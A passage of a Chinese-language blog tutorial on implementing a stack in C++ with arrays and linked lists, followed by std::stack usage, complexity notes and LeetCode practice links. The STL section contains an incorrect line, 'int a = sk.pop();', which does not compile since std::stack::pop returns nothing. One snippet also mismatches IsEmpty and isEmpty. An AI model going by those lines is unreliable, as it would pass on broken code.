class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing to pop!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//update top</span></span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Push的部分首先，**要先確定 Stack 滿了沒?**，確認方式就是檢查 <code>top</code> 的值是否跟 <code>capacity-1</code>一樣(因為是陣列，所以要扣1)，如果一樣，就代表滿了，需要更多空間，就直接呼叫剛才定義過的 <code>DoubleCapacity</code> 函數。接著就是push資料進Stack，這裡為了減少行數，將 <code>++top</code> 以及 <code>stack[top] =x</code> 合併乘同一行。</p><p>Pop的部分就需要先檢查Stack是否為空，因此需要先呼叫 <code>isEmpty()</code> 函數來確認是否是空，如果是空的就跳訊息並回到 main function，如果非空，那就直接將top值減少1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackArray::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return top element of stack</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing on the top!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack[top];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>isEmpty()</code> 的部分，就去比較top是否為初始值，如果是那就是空的，如果不是就不空。</li><li><code>Top()</code> 的部分，一樣會需要先檢查stack 是否為空，如果空的就回到main func，如果非空就回傳stack最top的內容值</li><li><code>getSize()</code>: 就直接回傳top+1 (因為陣列index運算的關係，一開始宣成-1，所以要加回來)</li></ul><h2 id="用-Linked-List-實作-Stack"><a href="#用-Linked-List-實作-Stack" class="headerlink" title="用 Linked List 實作 Stack"></a>用 Linked List 實作 Stack</h2><p><img src="/img/LeetCode/stack/linked_list.png"></p><p>如果用 Linked List來實作Stack，在Linkest List 中的 <code>first</code> 或 <code>head</code>，也就是鏈結的首端元素會是Stack的頂部，所以你要push到Stack，等同於是使用 Linked List中的 <code>push_front()</code> 函數。</p><p>下面的程式碼主要是透過兩個 class 來實作，分別是 <code>StackNode</code> 以及 <code>StackList</code>，<code>StackNode</code> 用來定義Linked List的節點，而 <code>StackList</code> 用來定應首端節點，也就是 <code>*top</code>。</p><blockquote><p><strong>用 Struct 和 Class 定義節點的差異在哪?</strong></p><blockquote><p>用 Struct 定義的成員變數一定是 public，誰都可以存取，但用class，可以將stack入口的 <code>top</code> 放入private，就可以限制對節點的存取，main()就無法變更每個節點的資料，這可能會是安全性上的考量</p></blockquote></blockquote><h3 id="完整程式碼-1"><a href="#完整程式碼-1" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define node structure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackNode</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> data;</span><br><span class="line">        StackNode *next;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//Define constructor</span></span><br><span class="line">        <span class="built_in">StackNode</span>(): <span class="built_in">data</span>(<span class="number">0</span>),<span class="built_in">next</span>(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//next = 0;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Define constructor with initial data</span></span><br><span class="line">        <span class="built_in">StackNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;</span><br><span class="line">        <span class="comment">//Define constructor with initial data and next node address</span></span><br><span class="line">        <span class="built_in">StackNode</span>(<span class="type">int</span> x, StackNode *nextNode):<span class="built_in">data</span>(x), <span class="built_in">next</span>(nextNode)&#123;&#125;;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define first node, and stack-related functions</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        StackNode *top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">StackList</span>():<span class="built_in">top</span>(<span class="number">0</span>),<span class="built_in">size</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        top = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//push_front() in linked list</span></span><br><span class="line">    StackNode *newNode = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">    <span class="comment">//Link the new node to the origin top node</span></span><br><span class="line">    newNode-&gt;next = top;</span><br><span class="line">    <span class="comment">//update top pointer</span></span><br><span class="line">    top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to pop out!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StackNode *tempNode = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    <span class="comment">// set tempNode to a null pointer, to prevent dangling pointer</span></span><br><span class="line">    <span class="comment">// The constructor will set the *next to  0 (NULL)</span></span><br><span class="line">    tempNode =<span class="number">0</span>;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackList::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to return&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> top-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    StackList sk;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">32</span>);</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">4</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;        </span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">15</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;         </span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;          </span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Empty stack, nothing to pop out!</span><br><span class="line"></span><br><span class="line">top: 4</span><br><span class="line">size: 2</span><br><span class="line"></span><br><span class="line">top: 15</span><br><span class="line">size: 3</span><br><span class="line"></span><br><span class="line">top: 32</span><br><span class="line">size: 1</span><br><span class="line">Empty stack, nothing to return</span><br><span class="line"></span><br><span class="line">top: -1</span><br><span class="line">size: 0</span><br></pre></td></tr></table></figure><h3 id="程式碼說明-1"><a href="#程式碼說明-1" class="headerlink" title="程式碼說明"></a>程式碼說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackNode</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    StackNode *next;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">StackNode</span>():<span class="built_in">data</span>(<span class="number">0</span>)&#123;</span><br><span class="line">        next = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">StackNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x)&#123;</span><br><span class="line">        next = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">StackNode</span>(<span class="type">int</span> x, StackNode *nextNode):<span class="built_in">data</span>(x),<span class="built_in">next</span>(nextNode)&#123;&#125;;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    StackNode *top;     <span class="comment">// remember the address of top element </span></span><br><span class="line">    <span class="type">int</span> size;           <span class="comment">// number of elements in Stack</span></span><br><span class="line"><span class="keyword">public</span>:                 </span><br><span class="line">    <span class="built_in">StackList</span>():<span class="built_in">size</span>(<span class="number">0</span>),<span class="built_in">top</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>StackNode 部分:</p><ul><li>首先一開始就先宣告 <code>class StackList</code>，因為在 <code>class StackNode</code> 中會先將 <code>StackList</code> 作為 friend class</li><li>接著就是定義 <code>class StackNode</code>，這裡定義了三個 constructor，分別對應三種狀況:<ul><li>未給參數，則將node中的 data 和指標初始化為0，這代表有一個single node，其資料為0</li><li>給定參數x，將node中的資料初始化為 x，而next為0，這代表single node資料為 x</li><li>給定參數x和下一個節點位址 <code>next</code>，這代表在非空stack中新增了一個節點</li></ul></li><li>之後就是將<code>StackList</code> 作為 <code>StackNode</code>　的 friend Class</li></ul><p>StackList部分:</p><ul><li>首先宣告 private 成員: <code>*top</code>, <code>size</code>，分別代表stack的頂端節點和stack的大小</li><li>之後就是 public 成員，首先一樣透過 constructor 去初始化 <code>size=0</code>, <code>top=0 (nullptr)</code></li><li>定義 <code>Push(int x)</code>, <code>Pop()</code>, <code>IsEmpty()</code>, <code>Top()</code>, <code>getSize()</code> 等函式</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        top = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//push_front() in linked list</span></span><br><span class="line">    StackNode *newNode = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">    <span class="comment">//Link the new node to the origin top node</span></span><br><span class="line">    newNode-&gt;next = top;</span><br><span class="line">    <span class="comment">//update top pointer</span></span><br><span class="line">    top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Push 函式的部分，首先一樣要確認是否式空的stack，因為這會牽涉到我們要用的constructor 是哪個，如果為空，那就建立一個新節點，<code>new StackNode(x)</code>，也就是建立一個 <code>data=x</code>的新節點，並且將 <code>top</code> 指向該節點，此時stack size 需要加上1，接著就 return main function。若stack非空，則需要實踐push_front 的功能，所以一樣新增一個新節點，這裡有兩種寫法，上面這種是透過第二個constructor 定義節點，在手動將他指向原先的top節點，再更新top指標，這裡也可以改寫成 <code>stackNode *newNode = new StackNode(x, top)</code>，然後再更新 top指標即可</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to pop out!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StackNode *tempNode = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    <span class="comment">// set tempNode to a null pointer, to prevent dangling pointer</span></span><br><span class="line">    <span class="comment">// The constructor will set the *next to  0 (NULL)</span></span><br><span class="line">    tempNode =<span class="number">0</span>;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Pop函式部分，一樣會需要先確認是否為空，如果stack是空的，那就return 回 main()</li><li>如果非空，那就跟常規 Linked List 刪除節點的步驟一樣，定義暫存節點，暫時保留top節點，接著將 top　更新為下一個節點，然後刪除暫存節點的資料</li><li>最重要的一步就是要將暫存節點設為 0，也就是 <code>nullptr</code> (因為 <code>next</code> 被設成0)以防止懸空指標發生，因為指標變數還存在。</li><li>記得 stack size 要-1</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackList::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to return&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> top-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>isEmpty</code> 就是去檢查 <code>size</code> 大小</li><li><code>Top()</code> 一樣要先去檢查是否為空stack，如果不是就直接回傳頂端節點的資料值</li><li><code>getSize()</code> 回傳 <code>size</code></li></ul><h1 id="Stack-相關的-STL"><a href="#Stack-相關的-STL" class="headerlink" title="Stack 相關的 STL"></a>Stack 相關的 STL</h1><p>需要引入 stack template library</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sk;</span><br></pre></td></tr></table></figure><p>尖括號內的<int>代表這個stack裡面放的都是整數<br>如果想要在stack裡面放其他型態的資料的話<br>也可以宣告成這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="type">float</span>&gt; sk;</span><br><span class="line">stack&lt;string&gt; sk;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; sk;</span><br></pre></td></tr></table></figure><p>使用 STL 就不需要自己實作  <code>push()</code> 和 <code>pop()</code> 了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">123</span>);           <span class="comment">//      | -78 |</span></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">666</span>);           <span class="comment">//      | 666 | </span></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">-78</span>);           <span class="comment">//      | 123 |   </span></span><br><span class="line">                        <span class="comment">//      |_____|</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = sk.<span class="built_in">pop</span>(); <span class="comment">// -78</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sk.<span class="built_in">top</span>(); <span class="comment">//666, since -78 is poped from stack</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sk.<span class="built_in">empty</span>(); <span class="comment">//return true or false</span></span><br></pre></td></tr></table></figure><h1 id="Stack-相關操作的時間複雜度"><a href="#Stack-相關操作的時間複雜度" class="headerlink" title="Stack 相關操作的時間複雜度"></a>Stack 相關操作的時間複雜度</h1><p>根據 [5] 的整理，常規 stack 操作的平均時間複雜度分別如下:</p><ul><li>Access: $O(N)$</li><li>Serach: $O(N)$</li><li>Insertion: $O(1)$</li><li>Deletion: $O(1)$</li></ul><p>$N$ 為stack中的資料數量</p><h1 id="Stack-經典LeetCode-題目"><a href="#Stack-經典LeetCode-題目" class="headerlink" title="Stack 經典LeetCode 題目"></a>Stack 經典LeetCode 題目</h1><p>Easy</p><ul><li><strong><a href="https://leetcode.com/problems/valid-parentheses/description/">20. Valid Parentheses</a></strong></li><li><strong><a href="https://leetcode.com/problems/maximum-nesting-depth-of-the-parentheses/description/">1614. Maximum Nesting Depth of the Parentheses</a></strong></li><li><strong><a href="https://leetcode.com/problems/implement-queue-using-stacks/description/">232. Implement Queue using Stacks</a></strong></li></ul><p>Medium</p><ul><li><strong><a href="https://leetcode.com/problems/simplify-path/description/?envType=study-plan-v2&envId=top-interview-150">71. Simplify Path</a></strong></li><li><strong><a href="https://leetcode.com/problems/min-stack/description/">155. Min Stack</a></strong></li><li><strong><a href="https://leetcode.com/problems/evaluate-reverse-polish-notation/description/?envType=study-plan-v2&envId=top-interview-150">150. Evaluate Reverse Polish Notation</a></strong></li></ul><p>Hard</p><ul><li><strong><a href="https://leetcode.com/problems/basic-calculator/description/?envType=study-plan-v2&envId=top-interview-150">224. Basic Calculator</a></strong></li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://hackmd.io/@meyr543/SksrPAEIt">https://hackmd.io/@meyr543/SksrPAEIt</a><br>[2] <a href="https://hackmd.io/@Greenleaf/advanced_cpp#%F0%9F%8E%A0-stack-%E5%A0%86%E7%96%8A">https://hackmd.io/@Greenleaf/advanced_cpp#%F0%9F%8E%A0-stack-%E5%A0%86%E7%96%8A</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/stack-yi-arrayyu-linked-listshi-zuo.html">https://alrightchiu.github.io/SecondRound/stack-yi-arrayyu-linked-listshi-zuo.html</a><br>[4] <a href="https://hackmd.io/@CLKO/BkZaF56Cm?type=view">https://hackmd.io/@CLKO/BkZaF56Cm?type=view</a><br>[5] <a href="https://www.bigocheatsheet.com/">https://www.bigocheatsheet.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兩鏈相加 | Medium |LeetCode#2. Add Two Numbers</title>
      <link href="/posts/3864fd1b.html"/>
      <url>/posts/3864fd1b.html</url>
      
